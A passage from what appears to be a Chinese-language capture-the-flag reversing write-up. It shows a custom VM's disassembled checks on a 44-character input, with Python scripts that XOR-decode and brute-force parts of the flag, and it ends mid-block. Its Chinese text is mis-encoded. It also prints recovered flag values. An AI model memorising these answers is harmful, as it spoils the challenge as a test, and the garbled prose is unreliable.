class="number">0x34</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg2=<span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xFE</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1=reg9&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x11</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;printf &#x27;%x\\n&#x27;, reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xA0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;cmp reg1=1877735783&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jne exit&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xA1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;read 0, s, 0x2Cu&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;cmp strlen(s), 44&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jne exit&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xB1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg9=<span class="subst">&#123;fog[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xB2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg9=<span class="subst">&#123;fog[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xA4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;fog[<span class="subst">&#123;now&#125;</span>]=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">4</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xB3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg9=fog[2]&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xB4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg9=fog[3]&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xC1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg1=s[<span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>]&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xC7</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;cmp <span class="subst">&#123;exit_door[<span class="number">0</span>]&#125;</span>, reg1&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jne exit&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xC8</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;cmp <span class="subst">&#123;exit_door[<span class="number">1</span>]&#125;</span>, reg1&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jne exit&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xC2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;exit if now!=r1&quot;</span>)</span><br><span class="line">            now += <span class="number">5</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">print_asm(opcode)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå˜é‡æ²¡æœ‰å‘½å¥½åã€‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line">read 0, s, 0x2Cu</span><br><span class="line">cmp strlen(s), 44</span><br><span class="line">jne exit</span><br><span class="line">reg1=s[0]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 74!=r1</span><br><span class="line">reg1=s[1]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[2]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 221!=r1</span><br><span class="line">reg1=s[3]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 15!=r1</span><br><span class="line">reg1=s[4]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 27!=r1</span><br><span class="line">reg1=s[5]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 137!=r1</span><br><span class="line">reg1=s[6]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[7]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 84!=r1</span><br><span class="line">reg1=s[8]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 79!=r1</span><br><span class="line">reg1=s[9]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 78!=r1</span><br><span class="line">reg1=s[10]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 85!=r1</span><br><span class="line">reg1=s[11]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 86!=r1</span><br><span class="line">reg1=s[12]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 142!=r1</span><br><span class="line">reg1=s[13]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 73!=r1</span><br><span class="line">reg1=s[14]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 14!=r1</span><br><span class="line">reg1=s[15]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 75!=r1</span><br><span class="line">reg1=s[16]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 6!=r1</span><br><span class="line">reg1=s[17]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 84!=r1</span><br><span class="line">reg1=s[18]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 26!=r1</span><br><span class="line">reg1=s[19]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 66!=r1</span><br><span class="line">reg1=s[20]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 83!=r1</span><br><span class="line">reg1=s[21]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 31!=r1</span><br><span class="line">reg1=s[22]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 82!=r1</span><br><span class="line">reg1=s[23]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 219!=r1</span><br><span class="line">reg1=s[24]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[25]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 217!=r1</span><br><span class="line">reg1=s[26]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[27]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 85!=r1</span><br><span class="line">reg1=s[28]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[29]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 0!=r1</span><br><span class="line">reg1=s[30]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 75!=r1</span><br><span class="line">reg1=s[31]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 30!=r1</span><br><span class="line">reg1=s[32]</span><br><span class="line">reg2= 24</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9=reg1</span><br><span class="line">reg1=s[33]</span><br><span class="line">reg2= 16</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[34]</span><br><span class="line">reg2= 8</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[35]</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=reg9</span><br><span class="line">reg2= 5</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg9=reg1</span><br><span class="line">reg2= 7</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg2= 2565961507</span><br><span class="line">reg1&amp;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg9=reg1</span><br><span class="line">reg2= 24</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg2= 904182048</span><br><span class="line">reg1&amp;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg9=reg1</span><br><span class="line">reg2= 18</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">cmp reg1=1877735783</span><br><span class="line">jne exit</span><br><span class="line">reg1=s[36]</span><br><span class="line">reg2= 24</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9=reg1</span><br><span class="line">reg1=s[37]</span><br><span class="line">reg2= 16</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[38]</span><br><span class="line">reg2= 8</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[39]</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=reg9</span><br><span class="line">r3 = 32</span><br><span class="line">reg1*=reg3</span><br><span class="line">reg4=reg1</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 17</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg5=reg1</span><br><span class="line">reg1=reg5</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 13</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg5</span><br><span class="line">reg9=reg1</span><br><span class="line">r3 = 32</span><br><span class="line">reg1*=reg3</span><br><span class="line">reg4=reg1</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 17</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg5=reg1</span><br><span class="line">reg1=reg5</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 13</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg5</span><br><span class="line">cmp 3474130140, reg1</span><br><span class="line">jne exit</span><br><span class="line">reg1=s[40]</span><br><span class="line">reg2= 24</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9=reg1</span><br><span class="line">reg1=s[41]</span><br><span class="line">reg2= 16</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[42]</span><br><span class="line">reg2= 8</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[43]</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=reg9</span><br><span class="line">r3 = 32</span><br><span class="line">reg1*=reg3</span><br><span class="line">reg4=reg1</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 17</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg5=reg1</span><br><span class="line">reg1=reg5</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 13</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg5</span><br><span class="line">reg9=reg1</span><br><span class="line">r3 = 32</span><br><span class="line">reg1*=reg3</span><br><span class="line">reg4=reg1</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 17</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg5=reg1</span><br><span class="line">reg1=reg5</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 13</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg5</span><br><span class="line">cmp 674991748, reg1</span><br><span class="line">jne exit</span><br></pre></td></tr></table></figure><p>å‰é¢å¼‚æˆ–ç›´æ¥ç»™aiç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">fog = [<span class="number">0x0000007B</span>, <span class="number">0x0000002F</span>, <span class="number">0x00000037</span>, <span class="number">0x000000E8</span>]</span><br><span class="line">s = [<span class="literal">None</span>] * <span class="number">32</span>  <span class="comment"># åˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸º 32 çš„åˆ—è¡¨æ¥å­˜å‚¨ s çš„å€¼</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹äºæ¯ä¸ª iï¼Œx å’Œ y çš„å€¼</span></span><br><span class="line"><span class="keyword">for</span> i, x, y <span class="keyword">in</span> [</span><br><span class="line">    (<span class="number">0</span>, fog[<span class="number">0</span>], <span class="number">74</span>), </span><br><span class="line">    (<span class="number">1</span>, fog[<span class="number">1</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">2</span>, fog[<span class="number">3</span>], <span class="number">221</span>), </span><br><span class="line">    (<span class="number">3</span>, fog[<span class="number">2</span>], <span class="number">15</span>), </span><br><span class="line">    (<span class="number">4</span>, fog[<span class="number">1</span>], <span class="number">27</span>), </span><br><span class="line">    (<span class="number">5</span>, fog[<span class="number">3</span>], <span class="number">137</span>), </span><br><span class="line">    (<span class="number">6</span>, fog[<span class="number">0</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">7</span>, fog[<span class="number">2</span>], <span class="number">84</span>), </span><br><span class="line">    (<span class="number">8</span>, fog[<span class="number">0</span>], <span class="number">79</span>), </span><br><span class="line">    (<span class="number">9</span>, fog[<span class="number">0</span>], <span class="number">78</span>), </span><br><span class="line">    (<span class="number">10</span>, fog[<span class="number">2</span>], <span class="number">85</span>), </span><br><span class="line">    (<span class="number">11</span>, fog[<span class="number">2</span>], <span class="number">86</span>), </span><br><span class="line">    (<span class="number">12</span>, fog[<span class="number">3</span>], <span class="number">142</span>), </span><br><span class="line">    (<span class="number">13</span>, fog[<span class="number">1</span>], <span class="number">73</span>), </span><br><span class="line">    (<span class="number">14</span>, fog[<span class="number">2</span>], <span class="number">14</span>), </span><br><span class="line">    (<span class="number">15</span>, fog[<span class="number">0</span>], <span class="number">75</span>), </span><br><span class="line">    (<span class="number">16</span>, fog[<span class="number">2</span>], <span class="number">6</span>), </span><br><span class="line">    (<span class="number">17</span>, fog[<span class="number">2</span>], <span class="number">84</span>), </span><br><span class="line">    (<span class="number">18</span>, fog[<span class="number">1</span>], <span class="number">26</span>), </span><br><span class="line">    (<span class="number">19</span>, fog[<span class="number">0</span>], <span class="number">66</span>), </span><br><span class="line">    (<span class="number">20</span>, fog[<span class="number">2</span>], <span class="number">83</span>), </span><br><span class="line">    (<span class="number">21</span>, fog[<span class="number">0</span>], <span class="number">31</span>), </span><br><span class="line">    (<span class="number">22</span>, fog[<span class="number">2</span>], <span class="number">82</span>), </span><br><span class="line">    (<span class="number">23</span>, fog[<span class="number">3</span>], <span class="number">219</span>), </span><br><span class="line">    (<span class="number">24</span>, fog[<span class="number">0</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">25</span>, fog[<span class="number">3</span>], <span class="number">217</span>), </span><br><span class="line">    (<span class="number">26</span>, fog[<span class="number">0</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">27</span>, fog[<span class="number">2</span>], <span class="number">85</span>), </span><br><span class="line">    (<span class="number">28</span>, fog[<span class="number">1</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">29</span>, fog[<span class="number">2</span>], <span class="number">0</span>), </span><br><span class="line">    (<span class="number">30</span>, fog[<span class="number">0</span>], <span class="number">75</span>), </span><br><span class="line">    (<span class="number">31</span>, fog[<span class="number">1</span>], <span class="number">30</span>)</span><br><span class="line">]:  </span><br><span class="line"></span><br><span class="line">    s[i] = <span class="built_in">chr</span>(y ^ x)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#16584abc45baff901c59dde3b1bb6701</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">characters = string.ascii_letters + string.digits + string.punctuation + <span class="string">&#x27; &#x27;</span></span><br><span class="line">combinations = itertools.product(characters, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">å¯¹æ¯ä¸ªç»„åˆæ‰§è¡Œç»™å®šçš„æ“ä½œ</span><br><span class="line"><span class="keyword">for</span> combination <span class="keyword">in</span> combinations:</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span>.join(combination)</span><br><span class="line">    reg = [<span class="number">0</span>] * <span class="number">10</span>  </span><br><span class="line">    reg[<span class="number">9</span>] = <span class="built_in">int</span>.from_bytes(s.encode(), <span class="string">&#x27;big&#x27;</span>)  </span><br><span class="line">    <span class="comment"># å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°,è¿™é‡Œç”¨bigï¼Œå­˜å‚¨å°±æ˜¯æ­£åºï¼Œä¸ç„¶æ˜¯å°ç«¯åºè½¬æ¢</span></span><br><span class="line"></span><br><span class="line">    reg[<span class="number">1</span>] = reg[<span class="number">9</span>]</span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">5</span></span><br><span class="line">    reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>]</span><br><span class="line">    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">9</span>] = reg[<span class="number">1</span>]</span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">7</span></span><br><span class="line">    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">2565961507</span></span><br><span class="line">    reg[<span class="number">1</span>] &amp;= reg[<span class="number">2</span>]</span><br><span class="line">    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">9</span>] = reg[<span class="number">1</span>]</span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">24</span></span><br><span class="line">    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">904182048</span></span><br><span class="line">    reg[<span class="number">1</span>] &amp;= reg[<span class="number">2</span>]</span><br><span class="line">    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">9</span>] = reg[<span class="number">1</span>]</span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">18</span></span><br><span class="line">    reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>]</span><br><span class="line">    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ£€æŸ¥ç»“æœæ˜¯å¦ç­‰äº 1877735783</span></span><br><span class="line">    <span class="keyword">if</span> reg[<span class="number">1</span>] == <span class="number">1877735783</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æ‰¾åˆ°äº†æ»¡è¶³æ¡ä»¶çš„å­—ç¬¦ä¸²ï¼š<span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># a245</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒéƒ¨åˆ†æœ‰ä¸ï¼Œä¸å¯èƒ½é€†å‡ºæ¥ï¼Œå¹²è„†çˆ†ç ´</p><p>åé¢ä¸¤æ¬¡æœ‰å·¦ç§»ï¼Œä¸å¥½ç”¨pythonï¼Œå°±ç”¨c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 